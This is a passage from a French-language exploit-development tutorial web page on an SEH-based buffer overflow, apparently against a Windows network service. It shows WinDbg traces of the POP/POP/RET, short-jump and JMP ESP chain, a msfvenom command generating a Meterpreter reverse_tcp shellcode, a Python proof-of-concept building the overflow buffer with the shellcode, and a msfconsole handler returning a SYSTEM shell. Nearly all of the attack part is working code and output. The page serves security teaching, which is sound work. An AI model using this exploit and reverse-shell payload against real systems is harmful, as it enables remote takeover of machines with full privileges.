<a id="__codelineno-69-44" name="__codelineno-69-44" href="#__codelineno-69-44"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-45" name="__codelineno-69-45" href="#__codelineno-69-45"></a><span class="n">libspp</span><span class="p">!</span><span class="n">pcre_exec</span><span class="p">+</span><span class="n">0x16462</span><span class="p">:</span>
<a id="__codelineno-69-46" name="__codelineno-69-46" href="#__codelineno-69-46"></a><span class="n">1015a2f2</span> <span class="n">c3</span>              <span class="n">ret</span>
<a id="__codelineno-69-47" name="__codelineno-69-47" href="#__codelineno-69-47"></a><span class="c">#</span>
<a id="__codelineno-69-48" name="__codelineno-69-48" href="#__codelineno-69-48"></a><span class="c"># SHORT JUMP</span>
<a id="__codelineno-69-49" name="__codelineno-69-49" href="#__codelineno-69-49"></a><span class="c">#</span>
<a id="__codelineno-69-50" name="__codelineno-69-50" href="#__codelineno-69-50"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-51" name="__codelineno-69-51" href="#__codelineno-69-51"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-52" name="__codelineno-69-52" href="#__codelineno-69-52"></a><span class="n">eip</span><span class="p">=</span><span class="n">01c9ff54</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-53" name="__codelineno-69-53" href="#__codelineno-69-53"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-54" name="__codelineno-69-54" href="#__codelineno-69-54"></a><span class="n">01c9ff54</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-69-55" name="__codelineno-69-55" href="#__codelineno-69-55"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-56" name="__codelineno-69-56" href="#__codelineno-69-56"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-57" name="__codelineno-69-57" href="#__codelineno-69-57"></a><span class="n">eip</span><span class="p">=</span><span class="n">01c9ff55</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-58" name="__codelineno-69-58" href="#__codelineno-69-58"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-59" name="__codelineno-69-59" href="#__codelineno-69-59"></a><span class="n">01c9ff55</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-69-60" name="__codelineno-69-60" href="#__codelineno-69-60"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-61" name="__codelineno-69-61" href="#__codelineno-69-61"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-62" name="__codelineno-69-62" href="#__codelineno-69-62"></a><span class="n">eip</span><span class="p">=</span><span class="n">01c9ff56</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-63" name="__codelineno-69-63" href="#__codelineno-69-63"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-64" name="__codelineno-69-64" href="#__codelineno-69-64"></a><span class="n">01c9ff56</span> <span class="n">eb06</span>            <span class="n">jmp</span>     <span class="n">01c9ff5e</span>
<a id="__codelineno-69-65" name="__codelineno-69-65" href="#__codelineno-69-65"></a><span class="c">#</span>
<a id="__codelineno-69-66" name="__codelineno-69-66" href="#__codelineno-69-66"></a><span class="c"># INCREMENTATION DE ESP</span>
<a id="__codelineno-69-67" name="__codelineno-69-67" href="#__codelineno-69-67"></a><span class="c">#</span>
<a id="__codelineno-69-68" name="__codelineno-69-68" href="#__codelineno-69-68"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-69" name="__codelineno-69-69" href="#__codelineno-69-69"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-70" name="__codelineno-69-70" href="#__codelineno-69-70"></a><span class="n">eip</span><span class="p">=</span><span class="n">01c9ff5e</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9f444</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-71" name="__codelineno-69-71" href="#__codelineno-69-71"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000246</span>
<a id="__codelineno-69-72" name="__codelineno-69-72" href="#__codelineno-69-72"></a><span class="n">01c9ff5e</span> <span class="n">6681c43008</span>      <span class="n">add</span>     <span class="n">sp</span><span class="p">,</span><span class="n">830h</span>
<a id="__codelineno-69-73" name="__codelineno-69-73" href="#__codelineno-69-73"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-74" name="__codelineno-69-74" href="#__codelineno-69-74"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-75" name="__codelineno-69-75" href="#__codelineno-69-75"></a><span class="n">eip</span><span class="p">=</span><span class="n">01c9ff63</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9fc74</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-76" name="__codelineno-69-76" href="#__codelineno-69-76"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000286</span>
<a id="__codelineno-69-77" name="__codelineno-69-77" href="#__codelineno-69-77"></a><span class="n">01c9ff63</span> <span class="n">ffe4</span>            <span class="n">jmp</span>     <span class="n">esp</span> <span class="p">{</span><span class="n">01c9fc74</span><span class="p">}</span>
<a id="__codelineno-69-78" name="__codelineno-69-78" href="#__codelineno-69-78"></a><span class="c">#</span>
<a id="__codelineno-69-79" name="__codelineno-69-79" href="#__codelineno-69-79"></a><span class="c"># SHELLCODE</span>
<a id="__codelineno-69-80" name="__codelineno-69-80" href="#__codelineno-69-80"></a><span class="c">#</span>
<a id="__codelineno-69-81" name="__codelineno-69-81" href="#__codelineno-69-81"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">dd</span> <span class="nv">@esp</span> <span class="n">L4</span>
<a id="__codelineno-69-82" name="__codelineno-69-82" href="#__codelineno-69-82"></a><span class="n">01c9fc74</span>  <span class="n">90909090</span> <span class="n">90909090</span> <span class="n">43434343</span> <span class="n">43434343</span>
<a id="__codelineno-69-83" name="__codelineno-69-83" href="#__codelineno-69-83"></a><span class="n">0</span><span class="p">:</span><span class="n">009</span><span class="p">&gt;</span> <span class="n">t</span>
<a id="__codelineno-69-84" name="__codelineno-69-84" href="#__codelineno-69-84"></a><span class="n">eax</span><span class="p">=</span><span class="n">77853b02</span> <span class="n">ebx</span><span class="p">=</span><span class="n">01c9f540</span> <span class="n">ecx</span><span class="p">=</span><span class="n">1015a2f0</span> <span class="n">edx</span><span class="p">=</span><span class="n">77853b20</span> <span class="n">esi</span><span class="p">=</span><span class="n">00000000</span> <span class="n">edi</span><span class="p">=</span><span class="n">00000000</span>
<a id="__codelineno-69-85" name="__codelineno-69-85" href="#__codelineno-69-85"></a><span class="n">eip</span><span class="p">=</span><span class="n">01c9fc74</span> <span class="n">esp</span><span class="p">=</span><span class="n">01c9fc74</span> <span class="n">ebp</span><span class="p">=</span><span class="n">01c9f458</span> <span class="n">iopl</span><span class="p">=</span><span class="n">0</span>         <span class="nb">nv </span><span class="n">up</span> <span class="n">ei</span> <span class="n">ng</span> <span class="n">nz</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<a id="__codelineno-69-86" name="__codelineno-69-86" href="#__codelineno-69-86"></a><span class="n">cs</span><span class="p">=</span><span class="n">001b</span>  <span class="n">ss</span><span class="p">=</span><span class="n">0023</span>  <span class="n">ds</span><span class="p">=</span><span class="n">0023</span>  <span class="n">es</span><span class="p">=</span><span class="n">0023</span>  <span class="n">fs</span><span class="p">=</span><span class="n">003b</span>  <span class="n">gs</span><span class="p">=</span><span class="n">0000</span>             <span class="n">efl</span><span class="p">=</span><span class="n">00000286</span>
<a id="__codelineno-69-87" name="__codelineno-69-87" href="#__codelineno-69-87"></a><span class="n">01c9fc74</span> <span class="n">90</span>              <span class="n">nop</span>
</code></pre></div>
<p>Visualisation équivalente des instructions assembleur mais depuis la fenêtre <code>Disassembly</code> :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="n">01c9ff54</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a><span class="n">01c9ff55</span> <span class="n">90</span>              <span class="n">nop</span>
<a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a><span class="n">01c9ff56</span> <span class="n">eb06</span>            <span class="n">jmp</span>     <span class="n">01c9ff5e</span>                       <span class="c"># Permet de jump par dessus `lock mov byte ptr ds:[90901015h],al`</span>
<a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a><span class="n">01c9ff58</span> <span class="n">f0a215109090</span>    <span class="n">lock</span> <span class="n">mov</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="p">:[</span><span class="n">90901015h</span><span class="p">],</span><span class="n">al</span>
<a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="n">01c9ff5e</span> <span class="n">6681c43008</span>      <span class="n">add</span>     <span class="n">sp</span><span class="p">,</span><span class="n">830h</span>                        <span class="c"># jump ici pour continuer l&#39;exécution</span>
<a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a><span class="n">01c9ff63</span> <span class="n">ffe4</span>            <span class="n">jmp</span>     <span class="n">esp</span>
</code></pre></div>
<p>On a maintenant l'espace suffisant pour stocker un <em>payload</em> et les moyens pour s'y rendre.</p>
<h3 id="obtenir-un-shell">Obtenir un shell</h3>
<p>Génération du <em>reverse shell</em> en utilisant <code>msfvenom</code> :</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode</code></p>
<p>Modification du PoC en conséquence :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="ch">#!/usr/bin/python</span>
<a id="__codelineno-71-2" name="__codelineno-71-2" href="#__codelineno-71-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
<a id="__codelineno-71-3" name="__codelineno-71-3" href="#__codelineno-71-3"></a><span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<a id="__codelineno-71-4" name="__codelineno-71-4" href="#__codelineno-71-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">struct</span><span class="w"> </span><span class="kn">import</span> <span class="n">pack</span>
<a id="__codelineno-71-5" name="__codelineno-71-5" href="#__codelineno-71-5"></a>
<a id="__codelineno-71-6" name="__codelineno-71-6" href="#__codelineno-71-6"></a><span class="k">try</span><span class="p">:</span>
<a id="__codelineno-71-7" name="__codelineno-71-7" href="#__codelineno-71-7"></a>  <span class="n">server</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<a id="__codelineno-71-8" name="__codelineno-71-8" href="#__codelineno-71-8"></a>  <span class="n">port</span> <span class="o">=</span> <span class="mi">9121</span>
<a id="__codelineno-71-9" name="__codelineno-71-9" href="#__codelineno-71-9"></a>  <span class="n">size</span> <span class="o">=</span> <span class="mi">1000</span>
<a id="__codelineno-71-10" name="__codelineno-71-10" href="#__codelineno-71-10"></a>
<a id="__codelineno-71-11" name="__codelineno-71-11" href="#__codelineno-71-11"></a>  <span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">20</span>
<a id="__codelineno-71-12" name="__codelineno-71-12" href="#__codelineno-71-12"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
<a id="__codelineno-71-13" name="__codelineno-71-13" href="#__codelineno-71-13"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xdb\xc7\xd9\x74\x24\xf4\x5f\xbd\x04\x1f\xda</span><span class="s2">&quot;</span>
<a id="__codelineno-71-14" name="__codelineno-71-14" href="#__codelineno-71-14"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x81\x2b\xc9\xb1\x59\x83\xc7\x04\x31\x6f\x15</span><span class="s2">&quot;</span>
<a id="__codelineno-71-15" name="__codelineno-71-15" href="#__codelineno-71-15"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
<a id="__codelineno-71-16" name="__codelineno-71-16" href="#__codelineno-71-16"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x63\xcc\xae\xfc\x94\x2d\x4f\x15\xf1\x2e\x4f</span><span class="s2">&quot;</span>
<a id="__codelineno-71-17" name="__codelineno-71-17" href="#__codelineno-71-17"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x19\x07\x13\x99\x20\x7d\x52\x19\x17\x8e\xe1</span><span class="s2">&quot;</span>
<a id="__codelineno-71-18" name="__codelineno-71-18" href="#__codelineno-71-18"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x3c\x3e\x05\x09\x12\x40\x0c</span><span class="s2">&quot;</span>
<a id="__codelineno-71-19" name="__codelineno-71-19" href="#__codelineno-71-19"></a>  <span class="n">shellcode</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x43</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">400</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-71-20" name="__codelineno-71-20" href="#__codelineno-71-20"></a>
<a id="__codelineno-71-21" name="__codelineno-71-21" href="#__codelineno-71-21"></a>  <span class="n">inputBuffer</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x41</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">124</span>
<a id="__codelineno-71-22" name="__codelineno-71-22" href="#__codelineno-71-22"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,(</span><span class="mh">0x06eb9090</span><span class="p">))</span>             <span class="c1"># (NSEH)</span>
<a id="__codelineno-71-23" name="__codelineno-71-23" href="#__codelineno-71-23"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;L&quot;</span><span class="p">,</span> <span class="p">(</span><span class="mh">0x1015a2f0</span><span class="p">))</span>            <span class="c1"># (SEH)  P/P/R</span>
<a id="__codelineno-71-24" name="__codelineno-71-24" href="#__codelineno-71-24"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">2</span>
<a id="__codelineno-71-25" name="__codelineno-71-25" href="#__codelineno-71-25"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x66\x81\xc4\x30\x08</span><span class="s2">&quot;</span>             <span class="c1"># ADD SP,0x830</span>
<a id="__codelineno-71-26" name="__codelineno-71-26" href="#__codelineno-71-26"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\xff\xe4</span><span class="s2">&quot;</span>                         <span class="c1"># JMP ESP</span>
<a id="__codelineno-71-27" name="__codelineno-71-27" href="#__codelineno-71-27"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">size</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">inputBuffer</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<a id="__codelineno-71-28" name="__codelineno-71-28" href="#__codelineno-71-28"></a>  <span class="n">inputBuffer</span> <span class="o">+=</span> <span class="n">shellcode</span>
<a id="__codelineno-71-29" name="__codelineno-71-29" href="#__codelineno-71-29"></a>
<a id="__codelineno-71-30" name="__codelineno-71-30" href="#__codelineno-71-30"></a><span class="p">[</span><span class="o">...</span><span class="p">]</span>
</code></pre></div>
<p>Exécution de l'exploit et récupération d'un reverse shell :</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="p">$</span> <span class="n">sudo</span> <span class="n">msfconsole</span> <span class="n">-q</span> <span class="n">-x</span> <span class="s2">&quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST &lt;IP&gt; ; set LPORT &lt;PORT&gt;&quot;</span> 
<a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a><span class="p">[...]</span>
<a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
<a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="n">meterpreter</span> <span class="p">&gt;</span> <span class="n">getuid</span>
<a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a><span class="n">Server</span> <span class="n">username</span><span class="p">:</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</code></pre></div>
<h2 id="reference">Référence</h2>
<ul>
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/seh-based-buffer-overflow">SEH Based Buffer Overflow</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1zM12.5 7v5.2l4 2.4-1 1L11 13V7zM11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="May 31, 2025 19:44:57 UTC">May 31, 2025</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.tooltips", "navigation.tracking", "navigation.top", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
      
    
  </body>
</html>